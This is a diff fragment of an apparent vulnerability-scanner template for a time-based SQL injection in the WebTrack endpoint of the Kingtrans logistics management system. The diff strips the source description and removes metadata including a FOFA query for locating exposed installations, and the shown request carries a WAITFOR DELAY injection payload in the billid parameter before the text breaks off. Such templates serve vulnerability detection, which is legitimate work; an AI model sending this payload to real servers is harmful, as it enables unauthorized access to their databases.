@@ -3,12 +3,8 @@ info:
   name: kingtrans物流管理系统WebTrack 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/umevhrl0obcsztga'
+  description: ''
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: umevhrl0obcsztga
-    fofa: body="www.kingtrans.net"
 http:
 - raw:
   - 'GET /WebTrack?action=getAccountTypeByNumber&billid=%27;%20WAITFOR%20DELAY%20%270:0:3%27--%20- HTTP/1.1
